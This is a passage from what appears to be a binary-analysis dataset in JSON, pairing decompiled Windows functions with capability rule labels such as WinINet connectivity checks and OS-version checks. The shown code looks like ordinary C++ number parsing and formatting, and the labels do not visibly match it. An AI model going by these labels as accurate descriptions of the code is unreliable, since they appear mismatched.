*(unaff_EBP + -0x28);\n        }\n        noname_0 = *(unaff_EBP + 8);\n        var_2ch = *(unaff_EBP + 0x14);\n        uVar11 = *(unaff_EBP + 0x10);\n    }\n    else {\n        if (uVar9 == 0x100) {\n            iVar10 = unaff_EBP + -0x28;\n            if (7 < *(unaff_EBP + -0x14)) {\n                iVar10 = *(unaff_EBP + -0x28);\n            }\n            noname_0 = *(unaff_EBP + 8);\n            puVar6 = fcn.004300bd(noname_0, unaff_EBP + -0x4c, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), iVar10, \n                                  arg_1ch_00);\n            puVar6 = fcn.00430c60(noname_0, unaff_EBP + -0x4c, *puVar6, puVar6[1], *(unaff_EBP + 0x1c), iVar7);\n            iVar7 = 0;\n            goto code_r0x00429c48;\n        }\n        noname_0 = *(unaff_EBP + 8);\n        puVar6 = fcn.00430c60(noname_0, unaff_EBP + -0x4c, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), *(unaff_EBP + 0x1c)\n                              , iVar7);\n        iVar7 = 0;\n        var_28h = unaff_EBP + -0x28;\n        if (7 < *(unaff_EBP + -0x14)) {\n            var_28h = *(unaff_EBP + -0x28);\n        }\n        var_2ch = puVar6[1];\n        uVar11 = *puVar6;\n    }\n    puVar6 = fcn.004300bd(noname_0, unaff_EBP + -0x4c, uVar11, var_2ch, var_28h, arg_1ch_00);\ncode_r0x00429c48:\n    uVar11 = *puVar6;\n    *(unaff_EBP + 0x10) = uVar11;\n    uVar4 = puVar6[1];\n    *(unaff_EBP + 0x14) = uVar4;\n    *(unaff_EBP + -0x48) = unaff_EBP + -0x28;\n    if (7 < *(unaff_EBP + -0x14)) {\n        *(unaff_EBP + -0x48) = *(unaff_EBP + -0x28);\n    }\n    puVar6 = fcn.004300bd(noname_0, unaff_EBP + -0x60, uVar11, uVar4, *(unaff_EBP + -0x48) + arg_1ch_00 * 2, \n                          *(unaff_EBP + -0x58) - arg_1ch_00);\n    iVar10 = *(unaff_EBP + -0x54);\n    uVar11 = *(unaff_EBP + 0x1c);\n    uVar4 = *puVar6;\n    arg_ch_00 = *(unaff_EBP + -100);\n    *(unaff_EBP + 0x10) = uVar4;\n    arg_14h_00 = puVar6[1];\n    *(iVar10 + 0x20) = 0;\n    *(iVar10 + 0x24) = 0;\n    *(unaff_EBP + 0x14) = arg_14h_00;\n    fcn.00430c60(noname_0, arg_ch_00, uVar4, arg_14h_00, uVar11, iVar7);\n    fcn.00406810();\n    fcn.00430cd4();\n    fcn.0043acb1();\n    return;\n}\n",
        "token_count": 2871
    },
    "00429cbf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n\nvoid __cdecl\nfcn.00429cbf(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint arg_ch_00;\n    uint arg_14h_00;\n    ushort uVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint uVar11;\n    uint noname_0;\n    int32_t unaff_EBP;\n    char *pcVar12;\n    uint32_t arg_1ch_00;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0043ad07(0x58);\n    uVar9 = *(unaff_EBP + 0x24);\n    pcVar12 = *(unaff_EBP + 0x20);\n    *(unaff_EBP + -100) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x54) = *(unaff_EBP + 0x18);\n    *(unaff_EBP + -0x5c) = uVar9;\n    if ((uVar9 == 0) || ((*pcVar12 != '+' && (*pcVar12 != '-')))) {\n        arg_1ch_00 = 0;\n    }\n    else {\n        arg_1ch_00 = 1;\n    }\n    if ((*(*(unaff_EBP + 0x18) + 0x14) & 0x3000) == 0x3000) {\n        uVar11 = 0x4744c0;\n        if (((arg_1ch_00 + 2 <= uVar9) && (pcVar12[arg_1ch_00] == '0')) &&\n           ((pcVar12[arg_1ch_00 + 1] == 'x' || (pcVar12[arg_1ch_00 + 1] == 'X')))) {\n            arg_1ch_00 = arg_1ch_00 + 2;\n        }\n    }\n    else {\n        uVar11 = 0x4744bc;\n    }\n    uVar11 = fcn.0045a0c0(pcVar12, uVar11);\n    *(unaff_EBP + -0x58) = uVar11;\n    *(unaff_EBP + -0x50) = 0x2e;\n    puVar6 = fcn.0045b6c6();\n    *(unaff_EBP + -0x50) = **puVar6;\n    iVar7 = fcn.0045a0c0(pcVar12, unaff_EBP + -0x50);\n    fcn.00421bb3(*(*(unaff_EBP + -0x54) + 0x30));\n    *(unaff_EBP + -4) = 0;\n    uVar11 = fcn.004284ab(unaff_EBP + -0x4c);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x44) = uVar11;\n    fcn.00401990();\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x14) = 7;\n    *(unaff_EBP + -0x28) = 0;\n    fcn.0040b6c0(*(unaff_EBP + -0x5c), 0);\n    iVar10 = unaff_EBP + -0x28;\n    *(unaff_EBP + -4) = 1;\n    if (7 < *(unaff_EBP + -0x14)) {\n        iVar10 = *(unaff_EBP + -0x28);\n    }\n    pcVar2 = *(**(unaff_EBP + -0x44) + 0x2c);\n    (**0x4742a4)(pcVar12, pcVar12 + *(unaff_EBP + -0x5c), iVar10);\n    (*pcVar2)();\n    fcn.00421bb3(*(*(unaff_EBP + -0x54) + 0x30));\n    *(unaff_EBP + -4) = 2;\n    piVar8 = fcn.00428f0b(unaff_EBP + -0x4c);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x44) = piVar8;\n    fcn.00401990();\n    pcVar2 = *(*piVar8 + 0x14);\n    (**0x4742a4)(unaff_EBP + -0x40);\n    (*pcVar2)();\n    *(unaff_EBP + -4) = 3;\n    pcVar2 = *(**(unaff_EBP + -0x44) + 0x10);\n    (**0x4742a4)();\n    uVar9 = (*pcVar2)();\n    uVar9 = uVar9 & 0xffff;\n    *(unaff_EBP + -0x48) = uVar9;\n    if (iVar7 == *(unaff_EBP + -0x5c)) {\n        iVar7 = *(unaff_EBP + -0x58);\n    }\n    else {\n        pcVar2 = *(**(unaff_EBP + -0x44) + 0xc);\n        (**0x4742a4)();\n        uVar5 = (*pcVar2)();\n        iVar10 = unaff_EBP + -0x28;\n        if (7 < *(unaff_EBP + -0x14)) {\n            iVar10 = *(unaff_EBP + -0x28);\n        }\n        uVar9 = *(unaff_EBP + -0x48);\n        *(iVar10 + iVar7 * 2) = uVar5;\n    }\n    pcVar12 = unaff_EBP + -0x40;\n    if (0xf < *(unaff_EBP + -0x2c)) {\n        pcVar12 = *(unaff_EBP + -0x40);\n    }\n    while (((cVar1 = *pcVar12,  cVar1 != '\\x7f' && ('\\0' < cVar1)) && (cVar1 < iVar7 - arg_1ch_00))) {\n        iVar7 = iVar7 - cVar1;\n        fcn.00435361(iVar7, 1, uVar9);\n        if ('\\0' < pcVar12[1]) {\n            pcVar12 = pcVar12 + 1;\n        }\n        uVar9 = *(unaff_EBP + -0x48);\n    }\n    iVar10 = *(unaff_EBP + -0x54);\n    uVar9 = *(unaff_EBP + -0x18);\n    *(unaff_EBP + -0x58) = uVar9;\n    uVar3 = *(iVar10 + 0x20);\n    if (((*(iVar10 + 0x24) < 0) || ((*(iVar10 + 0x24) < 1 && (uVar3 == 0)))) || (uVar3 <= uVar9)) {\n        iVar7 = 0;\n    }\n    else {\n        iVar7 = uVar3 - uVar9;\n    }\n    uVar9 = *(iVar10 + 0x14) & 0x1c0;\n    if (uVar9 == 0x40) {\n        var_28h = unaff_EBP + -0x28;\n        if (7 < *(unaff_EBP + -0x14)) {\n            var_28h = *(unaff_EBP + -0x28);\n        }\n        noname_0 = *(unaff_EBP + 8);\n        var_2ch = *(unaff_EBP + 0x14);\n        uVar11 = *(unaff_EBP + 0x10);\n    }\n    else {\n        if (uVar9 == 0x100) {\n            iVar10 = unaff_EBP + -0x28;\n            if (7 < *(unaff_EBP + -0x14)) {\n                iVar10 = *(unaff_EBP + -0x28);\n            }\n            noname_0 = *(unaff_EBP + 8);\n            puVar6 = fcn.004300bd(noname_0, unaff_EBP + -0x4c, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), iVar10, \n                                  arg_1ch_00);\n            puVar6 = fcn.00430c60(noname_0, unaff_EBP + -0x4c, *puVar6, puVar6[1], *(unaff_EBP + 0x1c), iVar7);\n            iVar7 = 0;\n            goto code_r0x00429f6f;\n        }\n        noname_0 = *(unaff_EBP + 8);\n        puVar6 = fcn.00430c60(noname_0, unaff_EBP + -0x4c, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), *(unaff_EBP + 0x1c)\n                              , iVar7);\n        iVar7 = 0;\n        var_28h = unaff_EBP + -0x28;\n        if (7 < *(unaff_EBP + -0x14)) {\n            var_28h = *(unaff_EBP + -0x28);\n        }\n        var_2ch = puVar6[1];\n        uVar11 = *puVar6;\n    }\n    puVar6 = fcn.004300bd(noname_0, unaff_EBP + -0x4c, uVar11, var_2ch, var_28h, arg_1ch_00);\ncode_r0x00429f6f:\n    uVar11 = *puVar6;\n    *(unaff_EBP + 0x10) = uVar11;\n    uVar4 = puVar6[1];\n    *(unaff_EBP + 0x14) = uVar4;\n    *(unaff_EBP + -0x48) = unaff_EBP + -0x28;\n    if (7 < *(unaff_EBP + -0x14)) {\n        *(unaff_EBP + -0x48) = *(unaff_EBP + -0x28);\n    }\n    puVar6 = fcn.004300bd(noname_0, unaff_EBP + -0x60, uVar11, uVar4, *(unaff_EBP + -0x48) + arg_1ch_00 * 2, \n                          *(unaff_EBP + -0x58) - arg_1ch_00);\n    iVar10 = *(unaff_EBP + -0x54);\n    uVar11 = *(unaff_EBP + 0x1c);\n    uVar4 = *puVar6;\n    arg_ch_00 = *(unaff_EBP + -100);\n    *(unaff_EBP + 0x10) = uVar4;\n    arg_14h_00 = puVar6[1];\n    *(iVar10 + 0x20) = 0;\n    *(iVar10 + 0x24) = 0;\n    *(unaff_EBP + 0x14) = arg_14h_00;\n    fcn.00430c60(noname_0, arg_ch_00, uVar4, arg_14h_00, uVar11, iVar7);\n    fcn.00406810();\n    fcn.00406350();\n    fcn.0043acb1();\n    return;\n}\n",
        "token_count": 2874
    },
    "0042adb8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ah\n// WARNING: Variable defined which should be unmapped: var_16h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042adb8(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t arg_10h_00;\n    code *pcVar1;\n    char cVar2;\n    int16_t iVar3;\n    int16_t iVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    uint *puVar9;\n    char **ppcVar10;\n    int32_t unaff_EBP;\n    int32_t iVar11;\n    char *pcVar12;\n    uint uVar13;\n    uchar *puVar14;\n    uchar *puVar15;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_60h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_1ah;\n    uint var_16h;\n    uint var_4h;\n    \n    fcn.0043ad07(0x88);\n    iVar11 = *(unaff_EBP + 0x18);\n    uVar6 = *(iVar11 + 0x14);\n    arg_10h_00 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x80) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x68) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + 0x1c);\n    if ((uVar6 & 0x3000) == 0x3000) {\n        fcn.0042bb18(*(unaff_EBP + 8), *(unaff_EBP + 0xc), arg_10h_00, *(unaff_EBP + 0x14), iVar11, *(unaff_EBP + 0x1c))\n        ;\n        goto code_r0x0042b462;\n    }\n    fcn.00421bb3(*(iVar11 + 0x30));\n    *(unaff_EBP + -4) = 0;\n    piVar5 = fcn.00428e65(unaff_EBP + -0x88);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x7c) = piVar5;\n    fcn.00401990();\n    pcVar1 = *(*piVar5 + 0x14);\n    (**0x4742a4)(unaff_EBP + -0x60);\n    (*pcVar1)();\n    uVar13 = *(iVar11 + 0x30);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x70) = *(unaff_EBP + -0x80);\n    *(unaff_EBP + -99) = 0;\n    *(unaff_EBP + -0x62) = 0;\n    fcn.00421bb3(uVar13);\n    *(unaff_EBP + -4) = 2;\n    piVar5 = fcn.00428405(unaff_EBP + -0x88);\n    *(unaff_EBP + -4) = 1;\n    fcn.00401990();\n    pcVar1 = *(*piVar5 + 0x2c);\n    (**0x4742a4)(0x4759e4, 0x4759f3, unaff_EBP + -0x30);\n    (*pcVar1)();\n    uVar13 = *(unaff_EBP + -0x68);\n    cVar2 = fcn.00435185(uVar13);\n    if (cVar2 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.00430056();\n        }\n        iVar3 = *(arg_10h_00 + 6);\n        if (iVar3 == *(unaff_EBP + -0x1a)) {\n            puVar14 = *(unaff_EBP + -0x80);\n            *puVar14 = 0x2b;\n        }\n        else {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                fcn.00430056();\n                iVar3 = *(arg_10h_00 + 6);\n            }\n            if (iVar3 != *(unaff_EBP + -0x1c)) goto code_r0x0042af09;\n            puVar14 = *(unaff_EBP + -0x80);\n            *puVar14 = 0x2d;\n        }\n        puVar14 = puVar14 + 1;\n        fcn.0042eb11();\n    }\n    else {\ncode_r0x0042af09:\n        puVar14 = *(unaff_EBP + -0x70);\n    }\n    piVar5 = *(unaff_EBP + -0x8c);\n    *puVar14 = 0x30;\n    *(unaff_EBP + -0x84) = puVar14;\n    puVar14 = puVar14 + 1;\n    *(unaff_EBP + -0x70) = puVar14;\n    iVar11 = *piVar5;\n    *(unaff_EBP + -0x61) = 0;\n    *(unaff_EBP + -0x74) = 0;\n    *(unaff_EBP + -0x6c) = 0;\n    *(unaff_EBP + -0x94) = ((iVar11 != 1000000000) - 1 & 0x2dc) + 0x24;\n    pcVar12 = unaff_EBP + -0x60;\n    *(unaff_EBP + -0x78) = pcVar12;\n    if (0xf < *(unaff_EBP + -0x4c)) {\n        pcVar12 = *(unaff_EBP + -0x60);\n        *(unaff_EBP + -0x78) = pcVar12;\n    }\n    if ((*pcVar12 == '\\x7f') || (*pcVar12 < '\\x01')) {\n        cVar2 = fcn.00435185(uVar13);\n        if (cVar2 == '\\0') {\n            do {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00430056();\n                }\n                uVar6 = fcn.0042758d(unaff_EBP + -0x30, *(arg_10h_00 + 6));\n                if (9 < uVar6) break;\n                iVar11 = *(unaff_EBP + -0x74);\n                if (*(unaff_EBP + -0x94) == iVar11 || *(unaff_EBP + -0x94) < iVar11) {\n                    *(unaff_EBP + -0x6c) = *(unaff_EBP + -0x6c) + 1;\n                    if (uVar6 != 0) {\n                        *(unaff_EBP + -0x62) = 1;\n                    }\n                }\n                else if ((uVar6 != 0) || (iVar11 != 0)) {\n                    *puVar14 = *(uVar6 + 0x4759e4);\n                    puVar14 = puVar14 + 1;\n                    *(unaff_EBP + -0x74) = iVar11 + 1;\n                }\n                *(unaff_EBP + -0x61) = 1;\n                fcn.0042eb11();\n                cVar2 = fcn.00435185(uVar13);\n            } while (cVar2 == '\\0');\n            *(unaff_EBP + -0x70) = puVar14;\n        }\n    }\n    else {\n        if (*(unaff_EBP + -0x50) == 0) {\n            *(unaff_EBP + -0x90) = 0;\n        }\n        else {\n            pcVar1 = *(**(unaff_EBP + -0x7c) + 0x10);\n            (**0x4742a4)();\n            uVar6 = (*pcVar1)();\n            *(unaff_EBP + -0x90) = uVar6 & 0xffff;\n        }\n        *(unaff_EBP + -0x38) = 0;\n        *(unaff_EBP + -0x34) = 0xf;\n        *(unaff_EBP + -0x48) = 0;\n        fcn.0040acd0(1, 0);\n        *(unaff_EBP + -4) = 3;\n        iVar11 = 0;\n        cVar2 = fcn.00435185(*(unaff_EBP + -0x68));\n        if (cVar2 != '\\0') {\n            pcVar12 = *(unaff_EBP + -0x48);\ncode_r0x0042b0c1:\n            do {\n                pcVar8 = *(unaff_EBP + -0x78);\n                while( true ) {\n                    if ((iVar11 == 0) || (cVar2 = *pcVar8,  cVar2 == '\\x7f')) goto code_r0x0042b109;\n                    iVar11 = iVar11 + -1;\n                    if (iVar11 != 0) {\n                        pcVar8 = unaff_EBP + -0x48;\n                        if (0xf < *(unaff_EBP + -0x34)) {\n                            pcVar8 = pcVar12;\n                        }\n                        if (cVar2 != pcVar8[iVar11]) goto code_r0x0042b105;\n                    }\n                    if (iVar11 == 0) {\n                        pcVar8 = unaff_EBP + -0x48;\n                        if (0xf < *(unaff_EBP + -0x34)) {\n                            pcVar8 = pcVar12;\n                        }\n                        if (cVar2 < *pcVar8) goto code_r0x0042b105;\n                    }\n                    pcVar8 = *(unaff_EBP + -0x78) + 1;\n                    if (*pcVar8 < '\\x01') break;\n                    *(unaff_EBP + -0x78) = pcVar8;\n                }\n            } while( true );\n        }\n        do {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                fcn.00430056();\n            }\n            uVar6 = fcn.0042758d(unaff_EBP + -0x30, *(arg_10h_00 + 6));\n            if (uVar6 < 10) {\n                iVar7 = *(unaff_EBP + -0x74);\n                *(unaff_EBP + -0x61) = 1;\n                if (*(unaff_EBP + -0x94) == iVar7 || *(unaff_EBP + -0x94) < iVar7) {\n                    *(unaff_EBP + -0x6c) = *(unaff_EBP + -0x6c) + 1;\n                    if (uVar6 != 0) {\n                        *(unaff_EBP + -0x62) = 1;\n                    }\n                }\n                else if ((uVar6 != 0) || (iVar7 != 0)) {\n                    *puVar14 = *(uVar6 + 0x4759e4);\n                    puVar14 = puVar14 + 1;\n                    *(unaff_EBP + -0x70) = puVar14;\n                    *(unaff_EBP + -0x74) = iVar7 + 1;\n                }\n                iVar7 = unaff_EBP + -0x48;\n                if (0xf < *(unaff_EBP + -0x34)) {\n                    iVar7 = *(unaff_EBP + -0x48);\n                }\n                if (*(iVar7 + iVar11) != '\\x7f') {\n                    iVar7 = unaff_EBP + -0x48;\n                    if (0xf < *(unaff_EBP + -0x34)) {\n                        iVar7 = *(unaff_EBP + -0x48);\n                    }\n                    *(iVar7 + iVar11) = *(iVar7 + iVar11) + '\\x01';\n                }\n            }\n            else {\n                pcVar12 = *(unaff_EBP + -0x48);\n                pcVar8 = unaff_EBP + -0x48;\n                if (0xf < *(unaff_EBP + -0x34)) {\n                    pcVar8 = pcVar12;\n                }\n                if ((pcVar8[iVar11] == '\\0') || (*(unaff_EBP + -0x90) == 0)) goto code_r0x0042b0a6;\n                iVar3 = *(arg_10h_00 + 6);\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00430056();\n                    iVar3 = *(arg_10h_00 + 6);\n                    pcVar12 = *(unaff_EBP + -0x48);\n                }\n                if (iVar3 != *(unaff_EBP + -0x90)) goto code_r0x0042b0a6;\n                fcn.00406de0(1, 0);\n                iVar11 = iVar11 + 1;\n            }\n            fcn.0042eb11();\n            cVar2 = fcn.00435185(*(unaff_EBP + -0x68));\n        } while (cVar2 == '\\0');\n        pcVar12 = *(unaff_EBP + -0x48);\ncode_r0x0042b0a6:\n        if (iVar11 == 0) goto code_r0x0042b0c1;\n        pcVar8 = unaff_EBP + -0x48;\n        if (0xf < *(unaff_EBP + -0x34)) {\n            pcVar8 = pcVar12;\n        }\n        if ('\\0' < pcVar8[iVar11]) {\n            iVar11 = iVar11 + 1;\n            goto code_r0x0042b0c1;\n        }\ncode_r0x0042b105:\n        *(unaff_EBP + -99) = 1;\ncode_r0x0042b109:\n        *(unaff_EBP + -4) = 1;\n        fcn.00406810();\n        uVar13 = *(unaff_EBP + -0x68);\n    }\n    cVar2 = fcn.00435185(uVar13);\n    if (cVar2 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.00430056();\n        }\n        iVar3 = *(arg_10h_00 + 6);\n        pcVar1 = *(**(unaff_EBP + -0x7c) + 0xc);\n        (**0x4742a4)();\n        iVar4 = (*pcVar1)();\n        if (iVar3 == iVar4) {\n            puVar9 = fcn.0045b6c6();\n            puVar14 = *(unaff_EBP + -0x70);\n            *puVar14 = **puVar9;\n            puVar14 = puVar14 + 1;\n            *(unaff_EBP + -0x70) = puVar14;\n            fcn.0042eb11();\n        }\n        else {\n            puVar14 = *(unaff_EBP + -0x70);\n        }\n        uVar13 = *(unaff_EBP + -0x68);\n    }\n    if ((**(unaff_EBP + -0x8c) != 1000000000) && (*(unaff_EBP + -0x74) == 0)) {\n        cVar2 = fcn.00435185(uVar13);\n        if (cVar2 == '\\0') {\n            iVar11 = *(unaff_EBP + -0x6c);\n            do {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00430056();\n                }\n                if (*(arg_10h_00 + 6) != *(unaff_EBP + -0x30)) break;\n                *(unaff_EBP + -0x61) = 1;\n                iVar11 = iVar11 + -1;\n                fcn.0042eb11();\n                cVar2 = fcn.00435185(uVar13);\n            } while (cVar2 == '\\0');\n            *(unaff_EBP + -0x6c) = iVar11;\n            puVar14 = *(unaff_EBP + -0x70);\n        }\n        iVar11 = *(unaff_EBP + -0x6c);\n        if (iVar11 < 0) {\n            *puVar14 = 0x30;\n            puVar14 = puVar14 + 1;\n            *(unaff_EBP + -0x6c) = iVar11 + 1;\n        }\n    }\n    while (cVar2 = fcn.00435185(uVar13),  cVar2 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.00430056();\n        }\n        uVar6 = fcn.0042758d(unaff_EBP + -0x30, *(arg_10h_00 + 6));\n        if (9 < uVar6) break;\n        iVar11 = *(unaff_EBP + -0x74);\n        if (iVar11 < *(unaff_EBP + -0x94)) {\n            *puVar14 = *(uVar6 + 0x4759e4);\n            puVar14 = puVar14 + 1;\n            *(unaff_EBP + -0x74) = iVar11 + 1;\n        }\n        else if (uVar6 != 0) {\n            *(unaff_EBP + -0x62) = 1;\n        }\n        *(unaff_EBP + -0x61) = 1;\n        fcn.0042eb11();\n    }\n    if (*(unaff_EBP + -0x62) != '\\0') {\n        pcVar12 = puVar14 + -1;\n        if (pcVar12 == *(unaff_EBP + -0x84)) {\ncode_r0x0042b2f3:\n            *(unaff_EBP + -0x6c) = *(unaff_EBP + -0x6c) + 1;\n            *pcVar12 = '1';\n        }\n        else {\n            do {\n                ppcVar10 = fcn.0045b6c6();\n                cVar2 = *pcVar12;\n                if (cVar2 != **ppcVar10) {\n                    if (cVar2 != '9') {\n                        pcVar8 = *(unaff_EBP + -0x84);\n                        *pcVar12 = cVar2 + '\\x01';\n                        break;\n                    }\n                    *pcVar12 = '0';\n                }\n                pcVar8 = *(unaff_EBP + -0x84);\n                pcVar12 = pcVar12 + -1;\n            } while (pcVar12 != pcVar8);\n            if (pcVar12 == pcVar8) goto code_r0x0042b2f3;\n        }\n        uVar13 = *(unaff_EBP + -0x68);\n    }\n    cVar2 = *(unaff_EBP + -0x61);\n    puVar15 = puVar14;\n    if (cVar2 != '\\0') {\n        cVar2 = fcn.00435185(uVar13);\n        if (cVar2 == '\\0') {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                fcn.00430056();\n            }\n            iVar3 = *(arg_10h_00 + 6);\n            if (iVar3 != *(unaff_EBP + -0x16)) {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00430056();\n                    iVar3 = *(arg_10h_00 + 6);\n                }\n                if (iVar3 != *(unaff_EBP + -0x18)) goto code_r0x0042b444;\n            }\n            *puVar14 = 0x65;\n            puVar15 = puVar14 + 1;\n            fcn.0042eb11();\n            iVar11 = 0;\n            *(unaff_EBP + -0x61) = 0;\n            *(unaff_EBP + -0x8c) = 0;\n            cVar2 = fcn.00435185(*(unaff_EBP + -0x68));\n            if (cVar2 == '\\0') {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00430056();\n                }\n                iVar3 = *(arg_10h_00 + 6);\n                if (iVar3 == *(unaff_EBP + -0x1a)) {\n                    *puVar15 = 0x2b;\n                }\n                else {\n                    if (*(arg_10h_00 + 4) == '\\0') {\n                        fcn.00430056();\n                        iVar3 = *(arg_10h_00 + 6);\n                    }\n                    if (iVar3 != *(unaff_EBP + -0x1c)) goto code_r0x0042b3aa;\n                    *puVar15 = 0x2d;\n                }\n                puVar15 = puVar14 + 2;\n                fcn.0042eb11();\n            }\ncode_r0x0042b3aa:\n            cVar2 = fcn.00435185(*(unaff_EBP + -0x68));\n            if (cVar2 == '\\0') {\n                uVar13 = *(unaff_EBP + -0x68);\n                do {\n                    if (*(arg_10h_00 + 4) == '\\0') {\n                        fcn.00430056();\n                    }\n                    if (*(arg_10h_00 + 6) != *(unaff_EBP + -0x30)) break;\n                    *(unaff_EBP + -0x61) = 1;\n                    fcn.0042eb11();\n                    cVar2 = fcn.00435185(uVar13);\n                } while (cVar2 == '\\0');\n                iVar11 = *(unaff_EBP + -0x8c);\n                if (*(unaff_EBP + -0x61) != '\\0') {\n                    *puVar15 = 0x30;\n                    puVar15 = puVar15 + 1;\n                }\n            }\n            while (cVar2 = fcn.00435185(*(unaff_EBP + -0x68)),  cVar2 == '\\0') {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00430056();\n                }\n                uVar6 = fcn.0042758d(unaff_EBP + -0x30, *(arg_10h_00 + 6));\n                if (9 < uVar6) break;\n                if (iVar11 < 8) {\n                    *puVar15 = *(uVar6 + 0x4759e4);\n                    puVar15 = puVar15 + 1;\n                    iVar11 = iVar11 + 1;\n                }\n                *(unaff_EBP + -0x61) = 1;\n                fcn.0042eb11();\n            }\n        }\ncode_r0x0042b444:\n        cVar2 = *(unaff_EBP + -0x61);\n    }\n    if ((*(unaff_EBP + -99) != '\\0') || (cVar2 == '\\0')) {\n        puVar15 = *(unaff_EBP + -0x80);\n    }\n    *puVar15 = 0;\n    fcn.00406810();\ncode_r0x0042b462:\n    fcn.0043acb1();\n    return;\n}\n",
        "token_count": 5411
    },
    "0042b468": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ah\n// WARNING: Variable defined which should be unmapped: var_16h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042b468(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t arg_10h_00;\n    code *pcVar1;\n    char cVar2;\n    int16_t iVar3;\n    int16_t iVar4;\n    int32_t *piVar5;\n    uchar *puVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    char *pcVar9;\n    uint *puVar10;\n    char **ppcVar11;\n    int32_t unaff_EBP;\n    int32_t iVar12;\n    char *pcVar13;\n    uint uVar14;\n    char *pcVar15;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_60h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_1ah;\n    uint var_16h;\n    uint var_4h;\n    \n    fcn.0043ad07(0x88);\n    iVar12 = *(unaff_EBP + 0x18);\n    uVar7 = *(iVar12 + 0x14);\n    arg_10h_00 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x80) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x68) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + 0x1c);\n    if ((uVar7 & 0x3000) == 0x3000) {\n        fcn.0042c278(*(unaff_EBP + 8), *(unaff_EBP + 0xc), arg_10h_00, 